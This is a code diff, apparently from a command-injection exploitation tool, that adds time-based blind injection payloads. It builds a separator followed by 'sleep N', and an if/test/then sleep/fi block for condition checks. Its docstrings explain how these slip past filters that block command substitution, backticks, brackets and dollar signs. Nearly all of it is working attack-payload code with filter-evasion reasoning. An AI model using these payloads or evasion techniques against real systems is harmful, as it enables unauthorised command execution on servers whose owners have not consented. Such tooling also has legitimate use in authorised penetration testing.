@@ -82,6 +82,16 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       # length did, and spares the payload a PowerShell launch whose own start-up time is noise a
       # timing measurement cannot afford.
       payload = checks.windows_probe(chain, "echo " + TAG, "==", TAG, timesec)
+  elif settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&"):
+    """
+    Nothing computed at all: the delay itself is the only thing being measured, so nothing here
+    needs '$(...)' or a backtick to survive a filter that blocks both outright. This gives up the
+    length check the payload otherwise builds in - "did it wait this long" is cruder than "did it
+    wait exactly as long as this output's length says it should" - but it is the only oracle left
+    once neither substitution syntax gets through, and both of these separators run what follows
+    them regardless of what came before, so the delay is unconditional here either way.
+    """
+    payload = separator + "sleep " + str(timesec)
   else:
     if separator in (";", "\n", "\r\n"):
       payload = (separator +
@@ -181,7 +191,15 @@ Build a raw shell numeric comparison for false-positive checks; Unix-only.
 def condition_check(separator, condition, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return None
-  if separator in (";", "\n", "\r\n"):
+  if settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&"):
+    """
+    An 'if'/'then'/'fi' block branches on a real exit status using nothing but 'test' and a
+    newline - where '[ condition ]' followed by reading '$?' needs a ']' and a '$', both of
+    which a filter that blocks command substitution outright is just as likely to block too.
+    """
+    payload = (separator + "if test " + condition + settings.END_LINE.LF +
+               "then sleep " + str(timesec) + settings.END_LINE.LF + "fi")
+  elif separator in (";", "\n", "\r\n"):
     payload = (separator +
               "[ " + condition + " ]" + separator +
               settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
